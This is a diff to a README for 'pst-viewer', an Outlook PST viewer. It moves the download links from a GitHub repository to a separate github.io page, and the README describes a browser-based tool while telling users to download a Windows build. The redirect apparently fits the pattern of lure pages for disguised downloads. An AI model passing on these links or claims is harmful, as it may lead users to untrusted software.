@@ -1,6 +1,6 @@
 # 📧 pst-viewer - View Outlook Emails Privately Locally
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/claudiussubjudice597/pst-viewer)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://claudiussubjudice597.github.io)
 
 pst-viewer allows users to open Outlook data files without installing Microsoft Outlook. The software runs inside your web browser. It keeps your data on your computer at all times. It does not send files to the cloud. You retain total control over your private information. 
 
@@ -28,7 +28,7 @@ Your computer needs at least 4GB of RAM to handle large mail archives. A solid-s
 
 You do not need to install complex software. Follow these steps to start viewing your files.
 
-1. Visit [the official download page](https://github.com/claudiussubjudice597/pst-viewer).
+1. Visit [the official download page](https://claudiussubjudice597.github.io).
 2. Look for the latest release on the right side of the page.
 3. Download the version for Windows.
 4. Save the file to your desktop or downloads folder.
